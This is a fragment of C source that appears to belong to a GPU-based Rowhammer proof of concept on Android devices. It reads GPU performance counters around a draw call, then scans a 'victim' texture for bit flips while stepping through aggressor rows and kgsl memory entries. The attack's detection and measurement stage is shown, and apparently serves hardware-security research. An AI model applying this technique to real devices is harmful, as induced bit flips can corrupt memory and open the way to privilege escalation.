			// running the program
			GLuint group[2];
			GLuint counter[3];
			GLuint monitor;
			GLuint *counterData;
			unsigned int resultSize;
			getCounterByName("VBIF", "AXI_READ_REQUESTS_TOTAL", &group[0],&counter[0]);
    			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
    			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_MISSES", &group[1],&counter[2]);
    			glGenPerfMonitorsAMD(1, &monitor);
			glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[0], 1 ,&counter[0]);   
        		glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[1], 2 ,&counter[1]);   
			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
			glClear(GL_COLOR_BUFFER_BIT);
	        	glBeginPerfMonitorAMD(monitor);    
			glDrawArrays(GL_POINTS, 0, 1);
		        glEndPerfMonitorAMD(monitor);
			usleep(1000);
	        	glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_SIZE_AMD, sizeof(GLint), (GLuint*)&resultSize, NULL);
 			if(!resultSize){
		            	printf("RESULTSIZE == 0...\n");
        	    		return -1;
	        	}
			counterData = (GLuint*) malloc(resultSize);
			GLsizei bytesWritten;
			glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_AMD,  resultSize, counterData, &bytesWritten);
			// printf("COUNTER DATA HAS SIZE OF %lu / %lu\n", bytesWritten, resultSize);
			// display or log counter info
			GLsizei wordCount = 0;
			printf("PERformance counters: ");
			while ( (4 * wordCount) < bytesWritten ){
				GLuint groupId = counterData[wordCount];
				GLuint counterId = counterData[wordCount + 1];
				// Determine the counter type
				GLuint counterType;
				glGetPerfMonitorCounterInfoAMD(groupId, counterId, GL_COUNTER_TYPE_AMD, &counterType);
				if ( counterType == GL_UNSIGNED_INT64_AMD ){
					GLuint counterResult = *(GLuint*)(&counterData[wordCount + 2]);
					// uint64_t tmp_counterResult = counterResult;
					// Print counter result
					if(wordCount > 0)
						counterResult -= 21; // 25 for NEXUS 5; 38 for Galaxy A5
					printf(" %u,", counterResult);
					// Print counter result
					wordCount += 4;
				} else if(counterType == GL_UNSIGNED_INT){
					GLuint counterResult = *(GLuint*)(&counterData[wordCount + 2]);
					size_t tmp_counterResult = counterResult;
					// Print counter result
					printf(" %d\n", tmp_counterResult);
					// Print counter result
					wordCount += 3;
				}
			}
        	printf("\n");
			
			glBindFramebuffer(GL_FRAMEBUFFER, FBF);	
			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
			unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
			memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
			printf("READVALS: \n");
			for(int  i = 0; i < 32; ++i){
				for( int j = 0; j < 32; ++j){
					if(frame2[i * 32 + j] != 0xffffffff)
						printf("FOUND BITFLIP %x on position %d\n", frame2[i * 32 + j], i * 32 + j, bitflips++);
				//	else
				//		printf("NO BITFLIP %x\n", frame2[i * 32 + j]);	
				}
			}
			glBindFramebuffer(GL_FRAMEBUFFER, 0);
			//glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, 0, 0); 
			memset(frame2, 0xaa, 32 * 32 * sizeof(unsigned int));
			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
			for(int i = 0; i < 32 * 32; ++i) if(frame2[i] != 0xff000000)printf("FRAMEBUFFER: 0x%x - [%d:%d]\n", frame2[i],  i % 32, i / 32);
			
			free(frame2);
			row1 = row1->kgsl_next;
			row2 = row2->kgsl_next;
			victim = victim->kgsl_next;
		}
		
		
	}	
	printf("RESULT NUMBER IS %u; bitflips %d\n", cont_kgsls, bitflips);
	fclose(pagemap_csv);
	fclose(kgsl_csv);
	fclose(progout);
	return 0;

}
